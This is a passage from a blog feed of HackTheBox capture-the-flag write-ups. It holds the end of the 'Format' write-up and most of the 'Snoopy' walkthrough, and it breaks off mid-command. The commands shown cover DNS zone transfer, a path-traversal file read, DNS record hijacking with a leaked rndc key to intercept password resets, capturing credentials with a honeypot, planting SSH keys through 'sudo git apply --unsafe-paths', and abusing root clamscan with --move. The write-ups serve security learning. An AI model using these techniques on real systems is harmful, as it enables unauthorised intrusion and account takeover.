\u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;_frozen_importlib_external.SourceFileLoader object at 0x7fa2f40bfc10\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;/usr/bin/license\u0026#39;, \u0026#39;__cached__\u0026#39;: None, \u0026#39;base64\u0026#39;: \u0026lt;module \u0026#39;base64\u0026#39; from \u0026#39;/usr/lib/python3.9/base64.py\u0026#39;\u0026gt;, \u0026#39;default_backend\u0026#39;: \u0026lt;function default_backend at 0x7fa2f3f12430\u0026gt;, \u0026#39;hashes\u0026#39;: \u0026lt;module \u0026#39;cryptography.hazmat.primitives.hashes\u0026#39; from \u0026#39;/usr/local/lib/python3.9/dist-packages/cryptography/hazmat/primitives/hashes.py\u0026#39;\u0026gt;, \u0026#39;PBKDF2HMAC\u0026#39;: \u0026lt;class \u0026#39;cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC\u0026#39;\u0026gt;, \u0026#39;Fernet\u0026#39;: \u0026lt;class \u0026#39;cryptography.fernet.Fernet\u0026#39;\u0026gt;, \u0026#39;random\u0026#39;: \u0026lt;module \u0026#39;random\u0026#39; from \u0026#39;/usr/lib/python3.9/random.py\u0026#39;\u0026gt;, \u0026#39;string\u0026#39;: \u0026lt;module \u0026#39;string\u0026#39; from \u0026#39;/usr/lib/python3.9/string.py\u0026#39;\u0026gt;, \u0026#39;date\u0026#39;: \u0026lt;class \u0026#39;datetime.date\u0026#39;\u0026gt;, \u0026#39;redis\u0026#39;: \u0026lt;module \u0026#39;redis\u0026#39; from \u0026#39;/usr/local/lib/python3.9/dist-packages/redis/__init__.py\u0026#39;\u0026gt;, \u0026#39;argparse\u0026#39;: \u0026lt;module \u0026#39;argparse\u0026#39; from \u0026#39;/usr/lib/python3.9/argparse.py\u0026#39;\u0026gt;, \u0026#39;os\u0026#39;: \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/usr/lib/python3.9/os.py\u0026#39;\u0026gt;, \u0026#39;sys\u0026#39;: \u0026lt;module \u0026#39;sys\u0026#39; (built-in)\u0026gt;, \u0026#39;License\u0026#39;: \u0026lt;class \u0026#39;__main__.License\u0026#39;\u0026gt;, \u0026#39;parser\u0026#39;: ArgumentParser(prog=\u0026#39;license\u0026#39;, usage=None, description=\u0026#39;Microblog license key manager\u0026#39;, formatter_class=\u0026lt;class \u0026#39;argparse.HelpFormatter\u0026#39;\u0026gt;, conflict_handler=\u0026#39;error\u0026#39;, add_help=True), \u0026#39;group\u0026#39;: \u0026lt;argparse._MutuallyExclusiveGroup object at 0x7fa2f2ab87c0\u0026gt;, \u0026#39;args\u0026#39;: Namespace(provision=\u0026#39;asdf\u0026#39;, deprovision=None, check=None), \u0026#39;r\u0026#39;: Redis\u0026lt;ConnectionPool\u0026lt;UnixDomainSocketConnection\u0026lt;path=/var/run/redis/redis.sock,db=0\u0026gt;\u0026gt;\u0026gt;, \u0026#39;__warningregistry__\u0026#39;: {\u0026#39;version\u0026#39;: 0}, \u0026#39;secret\u0026#39;: \u0026#39;unCR4ckaBL3Pa$$w0rd\u0026#39;, \u0026#39;secret_encoded\u0026#39;: b\u0026#39;unCR4ckaBL3Pa$$w0rd\u0026#39;, \u0026#39;salt\u0026#39;: b\u0026#39;microblogsalt123\u0026#39;, \u0026#39;kdf\u0026#39;: \u0026lt;...SNIP...\u0026gt; Here we can see the secret variable: unCR4ckaBL3Pa$$w0rd. This turns out to be the password for root!\n1 2 3 cooper@format:~$ su Password: root@format:/home/cooper# Reflection The initial vulnerability utilized to set our user account to \u0026ldquo;Pro\u0026rdquo; was something I have never seen before, and very interesting to discover! I liked how the box had a central focus on the redis applications, even to the point where we need to use it three times, each with a different goal and technique. The privilege escalation to root, however, I found to be rather frustratingly inconspicuous. It felt that if someone was unaware of particular python interactions, then there was very little chance to figure it out without external guidance. Moreover, having the secret key also being the root password is weird, a little too much like a CTF challenge.\n","date":"2023-09-30T09:11:52-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-format/Format_hucfdd9eb173c0886a8604431711aec1ea_316610_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-format/","title":"HackTheBox - Format"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Starting Nmap 7.94 ( https://nmap.org ) at 2023-05-07 20:21 EDT Nmap scan report for 10.10.11.212 Host is up (0.043s latency). Not shown: 62463 closed tcp ports (conn-refused), 3069 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA) |_ 256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519) 53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: SnoopySec Bootstrap Template - Index |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 34.45 seconds There is port 53 open, so zone transfer might be possible\nExamining the webpage appears to be a mostly functional website for SnoopySec:\nChecking the link for their recent announcement, we can see a reference to a download function: http://snoopy.htb/download?file=announcement.pdf\nFirstly to make the process seamless, I add snoopy.htb into my hosts file. This might also become important if we need to interact with the DNS server:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ tail /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.212 snoopy.htb Viewing the announcement.pdf file, we can find an employee name in the signature without much useful information:\nEnumerating subdomains via zone transfer With the DNS server name, we can attempt a zone transfer with dig to determine all subdomains:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ┌──(kali㉿kali)-[~/Documents/Snoopy/press_package] └─$ dig AXFR @10.10.11.212 snoopy.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; AXFR @10.10.11.212 snoopy.htb ; (1 server found) ;; global options: +cmd snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 snoopy.htb. 86400 IN NS ns1.snoopy.htb. snoopy.htb. 86400 IN NS ns2.snoopy.htb. mattermost.snoopy.htb. 86400 IN A 172.18.0.3 mm.snoopy.htb. 86400 IN A 127.0.0.1 ns1.snoopy.htb. 86400 IN A 10.0.50.10 ns2.snoopy.htb. 86400 IN A 10.0.51.10 postgres.snoopy.htb. 86400 IN A 172.18.0.2 provisions.snoopy.htb. 86400 IN A 172.18.0.4 www.snoopy.htb. 86400 IN A 127.0.0.1 snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 ;; Query time: 44 msec ;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP) ;; WHEN: Sun May 07 20:48:53 EDT 2023 ;; XFR size: 11 records (messages 1, bytes 325) We see several subdomains, particularly provisions.snoopy.htb, mm.snoopy.htb and mattermost.snoopy.htb. We can add these to our /etc/hosts file as well.\n1 10.10.11.212 snoopy.htb mattermost.snoopy.htb mm.snoopy.htb postgres.snoopy.htb provisions.snoopy.htb Since ns1 and ns2 are related to name servers, they will not be useful as subdomains.\nWhen we check out these addresses, we see mm.snoopy.htb points to a different page:\nTrying weak credentials does not work, so it seems there is not much we can do here.\nFile Read Vulnerability in download Returning to the download function, we can explore directory traversal techniques for a file read vulnerability. There is still a resulting download occurring, but the size is 0:\nWe can also confirm this is empty in the command line:\n1 2 3 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ file ~/Downloads/press_release.zip /home/kali/Downloads/press_release.zip: empty Although we are not getting /etc/passwd, we are still doing a download operation; there is no server error. When trying for simple filter bypasses, we land on a combination that works:\nThe file is still delivered as press_release.zip\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ unzip press_release.zip Archive: press_release.zip inflating: press_package/etc/passwd ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ cat press_package/etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin \u0026lt;...SNIP...\u0026gt; cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin lpelt:x:1003:1004::/home/lpelt:/bin/bash cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash Even though it is delivered as a zip, we are still sent the contents of /etc/passwd. From the passwd file we can see users on the box including sbrown, likely the account name for the PR contact Sally Brown.\nSnoopy\u0026rsquo;s mailserver is being migrated Further enumeration of source code files did not provide more insight, however when we explore the contact page of snoopy.htb we see an interesting notice:\nThe mailserver at mail.snoopy.htb is currently offline, which is confirmed by reviewing the zone transfer output. Returning back to the mm.snoopy.htb subdomain, we can deduce that registered accounts associated with machine usernames are linked to the offline mailserver. When attempting to reset password for an invalid user, the response is a vague confirmation:\nHowever, when trying to reset using a valid account like sbrown, we see a unique error:\nIf we could potentially set the mailserver to our own controlled machine, we might be able to receive these password reset emails. Using the file read vulnerability previously discovered, we can enumerate the DNS bind files:\nEnumerating DNS bind configurations Checking /etc/bind/named.conf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ cat press_package/etc/bind/named.conf // This is the primary configuration file for the BIND DNS server named. // // Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file. // // If you are just adding zones, please do that in /etc/bind/named.conf.local include \u0026#34;/etc/bind/named.conf.options\u0026#34;; include \u0026#34;/etc/bind/named.conf.local\u0026#34;; include \u0026#34;/etc/bind/named.conf.default-zones\u0026#34;; key \u0026#34;rndc-key\u0026#34; { algorithm hmac-sha256; secret \u0026#34;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=\u0026#34;; }; Here we can view a rndc-key secret. In /etc/bind/named.conf.local:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ cat press_package/etc/bind/named.conf.local // // Do any local configuration here // // Consider adding the 1918 zones here, if they are not used in your // organization //include \u0026#34;/etc/bind/zones.rfc1918\u0026#34;; zone \u0026#34;snoopy.htb\u0026#34; IN { type master; file \u0026#34;/var/lib/bind/db.snoopy.htb\u0026#34;; allow-update { key \u0026#34;rndc-key\u0026#34;; }; allow-transfer { 10.0.0.0/8; }; }; We can see DNS updates are allowed with the rndc-key. So now we should be able to send the DNS an update, telling that the mailserver is associated with our IP address. Then when we reset the password, we will be sent the reset link.\nUpdating mail.snoopy.htb making our key file:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ cat key key \u0026#34;rndc-key\u0026#34; { algorithm hmac-sha256; secret \u0026#34;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=\u0026#34;; }; Using nsupdate to update the mail server:\n1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ nsupdate -k key \u0026gt; server snoopy.htb \u0026gt; update add mail.snoopy.htb 3600 IN A 10.10.14.114 \u0026gt; show Outgoing update query: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: UPDATE, status: NOERROR, id: 0 ;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0 ;; UPDATE SECTION: mail.snoopy.htb. 3600 IN A 10.10.14.114 \u0026gt; send \u0026gt; We can verify the update with nslookup:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ nslookup \u0026gt; server snoopy.htb Default server: snoopy.htb Address: 10.10.11.212#53 \u0026gt; mail.snoopy.htb Server: snoopy.htb Address: 10.10.11.212#53 ** server can\u0026#39;t find mail.snoopy.htb: NXDOMAIN \u0026gt; mail.snoopy.htb ;; communications error to 10.10.11.212#53: timed out Server: snoopy.htb Address: 10.10.11.212#53 Name: mail.snoopy.htb Address: 10.10.14.114 \u0026gt; The first query to mail.snoopy.htb is done before updating, and we see the NXDOMAIN error. However, after sending the nsupdate and querying again, we are shown address 10.10.14.114.\nUsing Postfix to receive the password reset email After updating, we can send a reset email to ourselves successfully. However, just listening on the mail port is insufficient:\n1 2 3 4 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ nc -nvlp 25 listening on [any] 25 ... connect to [10.10.14.114] from (UNKNOWN) [10.10.11.212] 46070 There is a connection, but no reset instructions are transmitted. To set up a proper mail receiver, I decided to set up postfix. During installation, I labeled the system mail name as snoopy.htb:\nAfter setup, postfix must be launched:\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ systemctl start postfix ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ netstat -ntlp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN - tcp6 0 0 :::25 :::* LISTEN - We can see that we are indeed listening on port 25 now. We should be able to properly receive mail sent to our IP address. After spending more time troubleshooting, I learn that because the mail is intended for sbrown, my mail server mail is rejecting it, as there is no sbrown user on my system. Adding a sbrown target is a very simple command:\n1 2 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ sudo useradd sbrown And now finally, we successfully send a reset email for sbrown: Looking at our /var/mail, we see a piece for sbrown:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ ls -al /var/mail total 32 drwxrwsr-x 2 root mail 4096 May 08 15:48 . drwxr-xr-x 12 root root 4096 Mar 23 00:24 .. -rw------- 1 sbrown mail 21930 May 08 15:48 sbrown Using sudo to read it\u0026rsquo;s contents:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ sudo cat /var/mail/sbrown From no-reply@snoopy.htb Mon May 08 15:48:03 2023 Return-Path: \u0026lt;no-reply@snoopy.htb\u0026gt; X-Original-To: sbrown@snoopy.htb Delivered-To: sbrown@snoopy.htb Received: from mm.snoopy.htb (snoopy.htb [10.10.11.212]) by kali (Postfix) with UTF8SMTPS id 90EC23A0429 for \u0026lt;sbrown@snoopy.htb\u0026gt;; Mon, 08 May 2023 15:48:03 -0400 (EDT) \u0026lt;...SNIP...\u0026gt; \u0026lt;a href=3D\u0026#34;http://mm.snoopy.htb/res= et_password_complete?token=3D5t8ecbojkyd68bgtenyw8uiwfdniycgmsuusxyxt419hbz= ncc8bocmp9ezw9g4az\u0026#34; style=3D\u0026#34;display: inline-block; background: #FFFFFF; fo= nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd= ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: = #1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF= FF; padding: 15px 24px;\u0026#34; target=3D\u0026#34;_blank\u0026#34;\u0026gt; Reset Password \u0026lt;...SNIP...\u0026gt; Here we have a link referencing a reset_password and associated token. Each line seems to end with an = and a return, so after trimming the extra contents we are left with this: http://mm.snoopy.htb/reset_password_complete?token=5t8ecbojkyd68bgtenyw8uiwfdniycgmsuusxyxt419hbzncc8bocmp9ezw9g4az\nChanging the password to Password1, we are shown the reset is successful:\nNow we can authenticate as sbrown!\nFoothold Enumerating MatterMost chat histories Inside the mattermost server, we can see a discussion mentioning a provisioning channel. On the channels tab, we can see the Server Provisioning channel and server_provision command as well.\nMoving to the Server Provisioning channel, we can see the interesting custom /server_provision command previously discussed:\nExecuting the command, we are given a small form to request for a new server provision. We are able to submit an IP address of our choosing, and under the Operating System tab we can select Linux - TCP/2222.\nBefore submitting, I set up a listener on port 2222.\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ nc -nvlp 2222 listening on [any] 2222 ... connect to [10.10.14.114] from (UNKNOWN) [10.10.11.212] 57928 SSH-2.0-paramiko_3.1.0 Using Cowrie to establish an SSH honeypot There is an ssh authentication request, but we are not seeing any details from our netcat listener. To better understand the connection attempt, I set up an ssh honeypot with Cowrie.\nFirst, using docker to install Cowrie:\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ sudo docker pull cowrie/cowrie Using default tag: latest latest: Pulling from cowrie/cowrie 98478ba62ec6: Pulling fs layer 2b776ada0341: Pulling fs layer \u0026lt;...SNIP...\u0026gt; 4f4fb700ef54: Pull complete Digest: sha256:29a316fed1c9743594889adbaeeed5dd3640b00c724f9090844df8a95a70af9c Status: Downloaded newer image for cowrie/cowrie:latest docker.io/cowrie/cowrie:latest Next, using docker to run on port 2222:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ sudo docker run -p 2222:2222 cowrie/cowrie:latest /\u0026lt;...SNIP...\u0026gt; 2023-05-08T21:14:42+0000 [-] Generating new ed25519 keypair... 2023-05-08T21:14:42+0000 [-] Ready to accept SSH connections Finally, resubmit the server provision form. My cowrie server receives a connection attempt, and relays to me what credentials were used:\n1 2 3 4 5 6 7 8 2023-05-08T21:14:42+0000 [-] Ready to accept SSH connections \u0026lt;...SNIP...\u0026gt; 2023-05-08T21:15:49+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b\u0026#39;ssh-userauth\u0026#39; 2023-05-08T21:15:49+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b\u0026#39;cbrown\u0026#39; trying auth b\u0026#39;password\u0026#39; 2023-05-08T21:15:49+0000 [HoneyPotSSHTransport,0,10.10.11.212] Could not read etc/userdb.txt, default database activated 2023-05-08T21:15:49+0000 [HoneyPotSSHTransport,0,10.10.11.212] login attempt [b\u0026#39;cbrown\u0026#39;/b\u0026#39;sn00pedcr3dential!!!\u0026#39;] failed 2023-05-08T21:15:50+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b\u0026#39;cbrown\u0026#39; failed auth b\u0026#39;password\u0026#39; 2023-05-08T21:15:50+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: () We now have credentials as cbrown:sn00pedcr3dential!!! and can use this to access the system!\nLateral Movement Leveraging git apply to patch files outside of git repository Checking sudo privs:\n1 2 3 4 5 6 7 cbrown@snoopy:~$ sudo -l [sudo] password for cbrown: Matching Defaults entries for cbrown on snoopy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User cbrown may run the following commands on snoopy: (sbrown) PASSWD: /usr/bin/git apply * With git apply, we can use a patch file containing git differences, and apply the changes specified. With the --unsafe-paths flag, we are able to make changes to files outside the regular git directory. We can use this for lateral movement by creating a git diff file in which we add our ssh public key to authorized_keys, and point the edit path to be in /home/sbrown/.ssh/ folder. This will allow us to authenticate as sbrown using our own ssh key. Generating the ssh key in kali:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ ssh-keygen -t rsa -b 4096 Generating public/private rsa key pair. Enter file in which to save the key (/home/kali/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kali/.ssh/id_rsa Now, getting our id_rsa.pub, we will add this to the target\u0026rsquo;s authorized_keys file:\n1 2 3 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ== kali@kali First making a git repository with an initial commit:\n1 2 3 4 5 6 7 8 9 10 cbrown@snoopy:/dev/shm$ mkdir gittest cbrown@snoopy:/dev/shm$ cd gittest/ cbrown@snoopy:/dev/shm/gittest$ git init Initialized empty Git repository in /dev/shm/gittest/.git/ cbrown@snoopy:/dev/shm/gittest$ touch test cbrown@snoopy:/dev/shm/gittest$ git add . cbrown@snoopy:/dev/shm/gittest$ git commit -m \u0026#39;init\u0026#39; [main (root-commit) 6e665e0] init 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 test After 1 commit, we have a reference. We add the authorized_keys file and make a 2nd commit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cbrown@snoopy:/dev/shm/gittest$ vim authorized_keys cbrown@snoopy:/dev/shm/gittest$ git add . cbrown@snoopy:/dev/shm/gittest$ git commit -m \u0026#39;test\u0026#39; [main 6d81c28] test 1 file changed, 1 insertion(+) create mode 100644 authorized_keys cbrown@snoopy:/dev/shm/gittest$ git log commit 6d81c284773a4d699ac388166473090e3375beb8 (HEAD -\u0026gt; main) Author: cbrown \u0026lt;cbrown@snoopy.htb\u0026gt; Date: Tue May 09 15:33:35 2023 +0000 test commit 6e665e02a51919d212d5d9fdf6ac01a513cc23e6 Author: cbrown \u0026lt;cbrown@snoopy.htb\u0026gt; Date: Tue May 09 15:31:22 2023 +0000 init Now we can use git diff to create a diff file:\n1 2 3 4 5 6 7 8 cbrown@snoopy:/dev/shm/gittest$ git diff 6e665e02a51919d212d5d9fdf6ac01a513cc23e6 diff --git a/authorized_keys b/authorized_keys new file mode 100644 index 0000000..90fad14 --- /dev/null +++ b/authorized_keys @@ -0,0 +1 @@ +sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ== kali@kali Executing the git apply:\n1 2 3 cbrown@snoopy:/dev/shm/gittest$ sudo -u sbrown git apply --unsafe-paths --directory \u0026#34;/home/sbrown/.ssh\u0026#34; patch Checking patch /home/sbrown/.ssh/authorized_keys... Applied patch /home/sbrown/.ssh/authorized_keys cleanly. Now we can authenticate:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ ssh sbrown@10.10.11.212 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64) \u0026lt;...SNIP...\u0026gt; sbrown@snoopy:~$ Privilege Escalation Abusing ClamAV scanning to rewrite authorized_keys Checking for sudo privileges:\n1 2 3 4 5 6 sbrown@snoopy:~$ sudo -l Matching Defaults entries for sbrown on snoopy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User sbrown may run the following commands on snoopy: (root) NOPASSWD: /usr/local/bin/clamscan We are able to run clamscan, an antivirus scanner, as root. One of the features of this scanner is we can supply our own virus signature databases, and we are also able to specify how we might treat \u0026ldquo;infected\u0026rdquo; files. My idea was to create an extremely generic virus database, one that will flag whichever file I want even when I can\u0026rsquo;t read it. Next, I scan my own authorized_keys file, and set the scan to move infected files to /root/.ssh/. When this happens, I will be able to authenticate once again with my own key.\nUsing this resource to generate a vague database. First, use xxd to generate the first segment of hex:\n1 2 3 4 sbrown@snoopy:/tmp$ xxd /home/sbrown/.ssh/authorized_keys 00000000: 7373 682d 7273 6120 4141 4141 4233 4e7a ssh-rsa AAAAB3Nz 00000010: 6143 3179 6332 4541 4141 4144 4151 4142 aC1yc2EAAAADAQAB \u0026lt;...SNIP...\u0026gt; The virus database is considered malformed if I use a signature fewer than 8 characters. So, using the first 8, I create a database with 1 entry:\n1 2 sbrown@snoopy:/tmp$ cat 1.ndb Trojan.A:0:*:7373682d Now when we scan any authorized_keys file, it is flagged as a virus:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 sbrown@snoopy:/tmp$ clamscan -d 1.ndb /home/sbrown/.ssh/authorized_keys Loading: 0s, ETA: 0s [========================\u0026gt;] 1/1 sigs Compiling: 0s, ETA: 0s [========================\u0026gt;] 40/40 tasks /home/sbrown/.ssh/authorized_keys: Trojan.A.UNOFFICIAL FOUND ----------- SCAN SUMMARY ----------- Known viruses: 1 Engine version: 1.0.0 Scanned directories: 0 Scanned files: 1 Infected files: 1 Data scanned: 0.00 MB Data read: 0.00 MB (ratio 0.00:1) Time: 0.010 sec (0 m 0 s) Start Date: 2023:05:09 22:29:21 End Date: 2023:05:09 22:29:21 If we send a copy to /root/.ssh/authorized_keys now, it will be renamed to authorized_keys1 since there already exists keys. We can scan /root/.ssh/authorized_keys now, and move it somewhere else:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb /root/.ssh/authorized_keys --move=./ Loading: 0s, ETA: 0s [========================\u0026gt;] 1/1 sigs Compiling: 0s, ETA: 0s [========================\u0026gt;] 40/40 tasks /root/.ssh/authorized_keys: Trojan.A.UNOFFICIAL FOUND traverse_rename: Failed to rename: /root/.ssh/authorized_keys to: /tmp/authorized_keys Error:Invalid cross-device link /root/.ssh/authorized_keys: moved to \u0026#39;/tmp/authorized_keys\u0026#39; ----------- SCAN SUMMARY ----------- Known viruses: 1 Engine version: 1.0.0 Scanned directories: 0 Scanned files: 1 Infected files: 1 Data scanned: 0.00 MB Data read: 0.00 MB (ratio 0.00:1) Time: 0.010 sec (0 m 0 s) Start Date: 2023:05:09 22:32:34 End Date: 2023:05:09 22:32:34 Now I edited this authorized_keys to recognize my kali private key:\n1 2 sbrown@snoopy:/tmp$ cat authorized_keys ssh-rsa 